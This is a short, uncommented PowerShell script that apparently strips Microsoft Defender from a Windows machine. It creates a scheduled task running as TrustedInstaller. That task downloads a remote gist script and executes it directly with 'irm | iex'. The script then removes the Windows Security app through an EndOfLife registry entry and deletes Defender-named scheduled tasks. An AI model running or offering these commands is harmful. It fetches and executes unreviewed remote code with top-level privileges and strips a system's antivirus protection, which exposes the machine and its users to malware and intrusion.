Register-ScheduledTask Defender -Ac (New-ScheduledTaskAction powershell "irm gist.github.com/GabiNun/17c4cc1a9cd6069e729947c4363513cc/raw/Defender.ps1 | iex") -U 'NT SERVICE\TrustedInstaller'
Start-ScheduledTask Defender

$Appx = (Get-AppxPackage *SecHealthUI).PackageFullName;$Sid = (glu $Env:USERNAME).Sid.Value
New-Item HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Appx\AppxAllUserStore\EndOfLife\$Sid\$Appx -Force; Remove-AppxPackage $Appx

ScheduledTask '*Defender*' | Unregister-ScheduledTask -Confirm:$False
